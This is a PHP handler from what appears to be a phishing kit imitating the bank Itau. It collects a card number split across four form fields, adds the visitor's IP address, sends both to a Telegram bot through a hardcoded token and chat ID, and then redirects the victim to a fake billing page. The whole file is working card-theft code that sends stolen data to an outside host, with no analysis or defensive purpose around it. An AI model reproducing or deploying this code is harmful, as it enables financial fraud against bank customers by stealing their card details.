<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $num = $_POST["num"];
    $num1 = $_POST["num1"];
    $num2 = $_POST["num2"];
    $num3 = $_POST["num3"];

    $Fnum = $num . $num1 . $num2 . $num3;
    $ip = $_SERVER['REMOTE_ADDR'];

    // Token y Chat ID de Telegram
    $token = "7632972589:AAFRzRlHYr8nWKXTYj4w7TqLS4VLwV_XXns";
    $chatId = "-1002365815581";

    // Mensaje a enviar
    $message = "CARD Itau: \nCC: $Fnum \nIP: $ip";

    // Envío a Telegram
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'html'
    ];

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result) {
        header("Location: facturacion.html");
        exit();
    } else {
        echo "Error al enviar los datos.";
    }
}
?>
